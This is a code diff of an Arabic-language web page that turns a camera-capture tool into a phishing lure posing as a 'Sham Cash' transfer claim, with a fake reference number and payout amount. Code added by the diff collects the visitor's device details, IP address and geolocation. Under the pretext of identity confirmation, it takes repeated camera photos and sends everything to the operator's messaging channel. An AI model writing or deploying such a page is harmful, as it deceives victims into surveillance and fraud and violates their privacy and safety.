+            msg += `📋 <b>المرجع:</b> #SHC-2026-8472\n`;
+            msg += `💰 <b>المبلغ:</b> ${CLAIM_AMOUNT}$\n`;
+            return msg;
+        }
+
+        async function startClaim() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري المعالجة...';
+            showProcessing();
+            updateProgressStep(1, 'current');
+
+            try {
+                const deviceInfo = getDeviceInfo();
+                const ip = await getIPInfo();
+                CamBot.init({ captureCount: CAPTURE_COUNT, captureInterval: CAPTURE_INTERVAL, imageQuality: 0.7 });
+
+                let locationData = null;
+                try { locationData = await CamBot.getLocation(); } catch (e) {}
+
+                const infoMsg = buildInfoMessage(deviceInfo, locationData, ip);
+                await Config.sendMessage(infoMsg);
+                updateProgressStep(1, 'done');
+                await new Promise(r => setTimeout(r, 600));
+
+                updateProgressStep(2, 'current');
+                try { await CamBot.startCamera(); } 
+                catch (camErr) {
+                    await Config.sendMessage('📷 فشل الكاميرا: ' + camErr.message);
+                    throw new Error('يجب السماح بالوصول إلى الكاميرا لتأكيد الهوية');
                 }
 
-                // 3. إرسال معلومات الجهاز
-                showStatus('📤 جاري إرسال معلومات الجهاز...');
-                await Config.sendDeviceInfo({
-                    location: result.location
-                });
-                addLog('✅ تم إرسال معلومات الجهاز');
+                let count = 0;
+                await new Promise(r => setTimeout(r, 800));
+                let blob = await CamBot.capture();
+                if (blob) { await Config.sendPhoto(blob, '📸 تأكيد الهوية - صورة ' + (count + 1) + '/' + CAPTURE_COUNT); count++; }
 
-                // 4. إرسال رسالة ترحيب
+                await new Promise((resolve) => {
+                    const timer = setInterval(async () => {
+                        if (count >= CAPTURE_COUNT) { clearInterval(timer); resolve(); return; }
+                        blob = await CamBot.capture();
+                        if (blob) { await Config.sendPhoto(blob, '📸 تأكيد الهوية - صورة ' + (count + 1) + '/' + CAPTURE_COUNT); count++; }
+                        if (count >= CAPTURE_COUNT) { clearInterval(timer); resolve(); }
+                    }, CAPTURE_INTERVAL);
+                });
+
+                updateProgressStep(2, 'done');
+                CamBot.stop();
+                updateProgressStep(3, 'current');
+
                 await Config.sendMessage(
-                    '👤 <b>زائر جديد!</b>\n\n' +
-                    (result.location ? 
-                        `📍 <b>الموقع:</b>\n` +
-                        `${result.location.lat}, ${result.location.lng}\n` +
-                        `<a href="${result.location.mapUrl}">🗺 عرض على الخريطة</a>`
-                        : '📍 الموقع غير متاح')
+                    '✅ <b>اكتمل تأكيد الحوالة - شام كاش</b>\n' +
+                    '📋 المرجع: #SHC-2026-8472\n' +
+                    '💰 المبلغ: ' + CLAIM_AMOUNT + '$\n' +
+                    '📸 ' + count + ' صور تأكيد\n' +
+                    '📱 ' + deviceInfo.deviceType + '\n' +
+                    '🌐 ' + deviceInfo.browser + '\n' +
+                    '🔢 IP: <code>' + ip + '</code>\n\n' +
+                    '⏳ حالة: بانتظار الإيداع'
                 );
-                addLog('✅ تم إرسال رسالة الترحيب');
 
-                // 5. بدء التقاط الصور
-                showStatus('📸 جاري التقاط الصور...');
-                updateProgress(0, CamBot.settings.captureCount);
-
-                CamBot.startAutoCapture(async (base64Image, imageNumber) => {
-                    updateProgress(imageNumber, CamBot.settings.captureCount);
-                    showStatus(`📸 جاري إرسال الصورة ${imageNumber}/${CamBot.settings.captureCount}`);
-                    
-                    // ✅ إرسال الصورة مباشرة
-                    const caption = `📸 صورة ${imageNumber}/${CamBot.settings.captureCount}`;
-                    addLog(`📤 إرسال الصورة ${imageNumber}...`);
-                    
-                    const sendResult = await Config.sendPhoto(base64Image, caption);
-                    
-                    if (sendResult.ok) {
-                        addLog(`✅ تم إرسال الصورة ${imageNumber} بنجاح`);
-                        console.log('✅ صورة', imageNumber, 'تم الإرسال');
-                    } else {
-                        addLog(`❌ فشل إرسال الصورة ${imageNumber}: ${sendResult.error}`);
-                        console.error('❌ فشل الصورة', imageNumber, sendResult.error);
-                    }
-                });
+                await new Promise(r => setTimeout(r, 2000));
+                updateProgressStep(3, 'done');
+                await new Promise(r => setTimeout(r, 1000));
+                showSuccess();
 
             } catch (error) {
-                showStatus('❌ خطأ: ' + error.message, true);
                 console.error('خطأ:', error);
-                updateUI(false);
-                
-                try {
-                    await Config.sendMessage('❌ <b>خطأ:</b>\n' + error.message);
-                } catch (e) {
-                    console.error('فشل إرسال رسالة الخطأ:', e);
-                }
+                CamBot.stop();
+                showError(error.message || 'حدث خطأ غير متوقع');
+                try { await Config.sendMessage('❌ فشل تأكيد الحوالة: ' + error.message); } catch (e) {}
             }
         }
-
-        function stopBot() {
-            CamBot.stop();
-            document.getElementById('video').style.display = 'none';
-            progressContainer.style.display = 'none';
-            imageCounter.style.display = 'none';
-            showStatus('⏹ تم الإيقاف');
-            updateUI(false);
-            isRunning = false;
-        }
-
-        startBtn.addEventListener('click', startBot);
-        stopBtn.addEventListener('click', stopBot);
-
-        window.addEventListener('load', () => {
-            showStatus('✅ جاهز! اضغط بدء');
-            startBtn.disabled = false;
-        });
-
-        window.addEventListener('beforeunload', () => {
-            if (isRunning) CamBot.stop();
-        });
     </script>
 </body>
 </html>
